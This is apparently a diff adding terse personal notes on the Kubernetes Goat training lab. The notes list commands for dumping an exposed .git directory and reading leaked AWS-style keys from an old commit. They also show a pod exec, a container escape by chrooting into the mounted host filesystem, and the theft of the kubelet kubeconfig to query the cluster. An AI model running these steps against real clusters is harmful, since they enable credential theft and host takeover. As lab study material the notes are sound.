@@ -1,0 +1,50 @@
+
+### Method 1 - Insecure Restry 
+Create pyton evne
+
+pip install git-dumpter 
+
+git-dumper http://localhost:1230/.git k8s-goat-git
+
+cd k8s-goat-giit 
+
+git log
+
+git checkout d7c173ad183c574109cd5c4c648ffe551755b576
+
+ls -la 
+
+cat .env 
+
+
+aws_access_key_id = AKIVSHD6243H22G1KIDC
+aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
+k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc
+
+
+### Method 2 - Insecure Registry 
+
+export POD_NAME=$(kubectl get pods --namespace default -l "app=build-code" -o jsonpath="{.items[0].metadata.name}")
+
+kubectl exec -it $POD_NAME -- sh
+
+## Container Escape 
+
+capsh --print
+
+mount
+
+ls /host-system/
+
+ls -la 
+
+chroot /host-system bash 
+
+docker ps 
+
+cat /var/lib/kubelet/kubeconfig 
+
+kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system 
+
+kubectl --kubeconfig /var/lib/kubelet/config get ndes
+
